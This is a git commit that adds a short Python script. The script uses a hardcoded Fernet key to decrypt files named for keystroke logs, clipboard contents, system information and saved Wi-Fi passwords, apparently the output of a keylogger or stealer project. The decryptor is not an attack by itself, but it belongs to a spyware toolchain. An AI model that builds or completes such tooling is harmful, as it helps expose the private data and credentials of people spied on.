296a80d96bfec7c02cb5750f4d8cc905c3dfe934
Kshitish <kshitishshetty@gmail.com>
2024-06-24 01:45:41 +0530

    encryption and decryption

---
+++ DecryptFile.py
@@ -0,0 +1,26 @@
+from cryptography.fernet import Fernet
+
+key = "94pJIpT_32DuV40AiHMqLm-F914oSaj8jQ8UrOCcVFE="
+
+system_information_e = 'e_systeminfo.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_key_log.txt'
+wifi_information_e = 'e_wifi_passwords.txt'
+
+
+encrypted_files = [system_information_e, clipboard_information_e, keys_information_e, wifi_information_e]
+count = 0
+
+
+for decrypting_files in encrypted_files:
+
+    with open(encrypted_files[count], 'rb') as f:
+        data = f.read()
+
+    fernet = Fernet(key)
+    decrypted = fernet.decrypt(data)
+
+    with open("decryption.txt", 'ab') as f:
+        f.write(decrypted)
+
+    count += 1
